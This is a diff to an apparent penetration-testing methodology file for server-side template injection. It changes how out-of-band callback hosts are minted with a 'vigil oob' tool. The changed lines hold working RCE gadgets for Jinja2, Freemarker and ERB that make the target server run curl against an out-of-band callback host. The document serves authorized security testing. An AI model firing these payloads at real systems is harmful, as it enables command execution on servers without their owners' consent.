@@ -17,7 +17,7 @@ vuln_class: ssti
 
 - curl / Burp Suite Repeater
 - SSTImap (automated SSTI detection and exploitation — active successor to tplmap)
-- `vigil oob mint` / `vigil oob poll` (mint a nonce-tagged callback URL and correlate blind-SSTI hits — see §5 Blind SSTI; replaces reading the listener log by hand)
+- `vigil oob mint` / `vigil oob poll` (mint binds a nonce under a running interactsh client's id and prints the exact callback host so `vigil oob poll` can correlate blind-SSTI hits — pass `--client <name>` when several clients run; fire the exact host mint prints — see §5 Blind SSTI; replaces reading the listener log by hand)
 - Custom polyglot payloads
 
 ## Methodology
@@ -93,14 +93,14 @@ When `{{7*7}}` evaluates server-side but the result is not reflected back (rende
 - [ ] **Out-of-band (preferred):** mint a nonce-tagged callback, embed it in an engine-specific RCE gadget so template execution fires the callback, then poll for the correlated hit:
       ```bash
       vigil oob status --json   # confirm readiness
-      vigil oob mint --technique ssti --target-url "https://target/profile" --param bio --probe-kind http
-      # -> http  http://<prefix>-<token>.oob.example.com/
+      vigil oob mint --client <name> --technique ssti --target-url "https://target/profile" --param bio --probe-kind http
+      # -> http  http://<prefix>-<token>.<client-id>.oob.example.com/   (= $OOB_HOST)
       ```
-      Embed the minted host in the gadget for the fingerprinted engine and deliver via the kali exec wrapper:
+      Embed the EXACT host mint printed (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host) in the gadget for the fingerprinted engine and deliver via the kali exec wrapper:
       ```
-      Jinja2:     {{config.__class__.__init__.__globals__['os'].popen('curl http://<prefix>-<token>.oob.example.com/').read()}}
-      Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://<prefix>-<token>.oob.example.com/")}
-      ERB:        <%= `curl http://<prefix>-<token>.oob.example.com/` %>
+      Jinja2:     {{config.__class__.__init__.__globals__['os'].popen('curl http://$OOB_HOST/').read()}}
+      Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://$OOB_HOST/")}
+      ERB:        <%= `curl http://$OOB_HOST/` %>
       ```
       Then correlate instead of grepping the listener log:
       ```bash
